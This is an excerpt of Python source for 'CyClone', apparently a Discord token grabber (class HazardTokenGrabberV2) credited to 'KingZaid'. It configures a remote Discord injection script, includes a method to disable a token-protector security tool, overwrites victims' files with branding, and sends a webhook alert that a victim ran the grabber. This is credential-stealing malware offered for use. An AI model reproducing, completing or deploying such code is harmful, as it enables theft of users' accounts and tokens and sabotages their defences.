...
__config__ = {
    ...
    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING KINGZAID PROTACT
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
    # if True, it will ping @everyone when someone ran CyClone
    'ping_on_run': False,
...
class HazardTokenGrabberV2(Functions):
    ...
    async def bypassTokenProtector(self):
        # fucks up the discord token protector 
        ...
        if ntpath.exists(config):
            ...
            with open(config, 'a') as f:
                f.write("\KingZaidjust shit on this token protector | https://kingzaid.ezyro.com")
...
{line_sep}
    ...
    def finish(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("🌟・Grabber By KingZaid#8049・https://kingzaid.ezyro.com")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\n🌟・Grabber By KingZaid#8049・https://kingzaid.ezyro.com")
        ...
        embed = {
            'avatar_url': 'https://media.discordapp.net/attachments/996915445254852698/997984499335962625/KingZaid-Icon-Gif-CyClone.gif',
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* Just ran CyClone Token Grabber',
                        'url': 'https://kingzaid.ezyro.com',
                        'icon_url': 'https://media.discordapp.net/attachments/996915445254852698/997984499335962625/KingZaid-Icon-Gif-CyClone.gif'
                    },
                    'color': 176185,
                    ...
                    'footer': {
                        'text': '🌟・Grabber By KingZaid#8049・https://kingzaid.ezyro.com'
                    }
                }
            ]
        }
